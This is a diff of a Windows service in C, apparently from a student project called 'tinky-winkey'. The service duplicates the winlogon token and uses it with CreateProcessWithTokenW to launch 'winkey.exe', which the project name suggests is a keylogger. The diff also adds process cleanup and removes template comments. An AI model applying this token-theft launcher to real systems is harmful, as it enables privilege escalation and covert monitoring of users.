@@ -67,7 +67,7 @@ BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 	return TRUE;
 }
 
-void impersonateUserToken()
+void impersonateUserToken(STARTUPINFO* si, PROCESS_INFORMATION* pi)
 {
     HANDLE winlogonTokenHandle;
     HANDLE winlogonDuplicateTokenHandle;
@@ -116,7 +116,7 @@ void impersonateUserToken()
 
 
 	// Call CreateProcessWithTokenW(), print return code and error code
-	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey.exe", NULL, 0, NULL, NULL, NULL, NULL);
+	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey.exe", NULL, 0, NULL, NULL, si, pi);
 	if (GetLastError() == NULL)
 		printf("[+] Process spawned!\n");
 	else
@@ -125,32 +125,18 @@ void impersonateUserToken()
 		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
 	}
 
-
     CloseHandle(winlogonTokenHandle);
 	CloseHandle(winlogonDuplicateTokenHandle);
 }
 
 
-//
-// Purpose: 
-//   Entry point for the process
-//
-// Parameters:
-//   None
-// 
-// Return value:
-//   None, defaults to 0 (zero)
-//
 int __cdecl _tmain(int argc, TCHAR *argv[]) 
 { 
-    impersonateUserToken();
-    return;
-    // If command-line parameter is "install", install the service. 
 
     // TO_DO: Add any additional services for the process to this table.
     SERVICE_TABLE_ENTRY DispatchTable[] = 
     { 
-        { SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain }, 
+        { (LPSTR)"tinky", (LPSERVICE_MAIN_FUNCTION) SvcMain }, 
         { NULL, NULL } 
     }; 
  
@@ -162,28 +148,16 @@ int __cdecl _tmain(int argc, TCHAR *argv[])
         // something went wrong
         printf("StartServiceCtrlDispatcher failed (%d)\n", GetLastError()); 
     } 
+    return 0;
 } 
 
-//
-// Purpose: 
-//   Entry point for the service
-//
-// Parameters:
-//   dwArgc - Number of arguments in the lpszArgv array
-//   lpszArgv - Array of strings. The first string is the name of
-//     the service and subsequent strings are passed by the process
-//     that called the StartService function to start the service.
-// 
-// Return value:
-//   None.
-//
 VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
 {
     // Register the handler function for the service
 
     gSvcStatusHandle = RegisterServiceCtrlHandler( 
         SVCNAME, 
-        SvcCtrlHandler);
+        (LPHANDLER_FUNCTION)SvcCtrlHandler);
 
     if( !gSvcStatusHandle )
     { 
@@ -205,29 +179,8 @@ VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
     SvcInit( dwArgc, lpszArgv );
 }
 
-//
-// Purpose: 
-//   The service code
-//
-// Parameters:
-//   dwArgc - Number of arguments in the lpszArgv array
-//   lpszArgv - Array of strings. The first string is the name of
-//     the service and subsequent strings are passed by the process
-//     that called the StartService function to start the service.
-// 
-// Return value:
-//   None
-//
 VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
 {
-    // TO_DO: Declare and set any required variables.
-    //   Be sure to periodically call ReportSvcStatus() with 
-    //   SERVICE_START_PENDING. If initialization fails, call
-    //   ReportSvcStatus with SERVICE_STOPPED.
-
-    // Create an event. The control handler function, SvcCtrlHandler,
-    // signals this event when it receives the stop control code.
-
     ghSvcStopEvent = CreateEvent(
                          NULL,    // default security attributes
                          TRUE,    // manual reset event
@@ -236,38 +189,37 @@ VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
 
     if ( ghSvcStopEvent == NULL)
     {
-        ReportSvcStatus( SERVICE_STOPPED, GetLastError(), 0 );
+        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
         return;
     }
 
-    // Report running status when initialization is complete.
+    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
 
-    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );
+    STARTUPINFO si = {0};
+	PROCESS_INFORMATION pi = {0};
 
-    // TO_DO: Perform work until service stops.
-    impersonateUserToken();
-    while(1)
+    impersonateUserToken(&si, &pi);
+
+    while (1)
     {
         WaitForSingleObject(ghSvcStopEvent, INFINITE);
 
-        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
-        return;
+        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
+        break;
     }
+
+    if (pi.hProcess) {
+		TerminateProcess(pi.hProcess, 0);
+	}
+
+	/* Cleanup handles */
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	CloseHandle(si.hStdInput);
+	CloseHandle(si.hStdError);
+	CloseHandle(si.hStdOutput);
 }
 
-//
-// Purpose: 
-//   Sets the current service status and reports it to the SCM.
-//
-// Parameters:
-//   dwCurrentState - The current state (see SERVICE_STATUS)
-//   dwWin32ExitCode - The system error code
-//   dwWaitHint - Estimated time for pending operation, 
-//     in milliseconds
-// 
-// Return value:
-//   None
-//
 VOID ReportSvcStatus( DWORD dwCurrentState,
                       DWORD dwWin32ExitCode,
                       DWORD dwWaitHint)
@@ -293,17 +245,6 @@ VOID ReportSvcStatus( DWORD dwCurrentState,
     SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
 }
 
-//
-// Purpose: 
-//   Called by SCM whenever a control code is sent to the service
-//   using the ControlService function.
-//
-// Parameters:
-//   dwCtrl - control code
-// 
-// Return value:
-//   None
-//
 VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
 {
    // Handle the requested control code. 
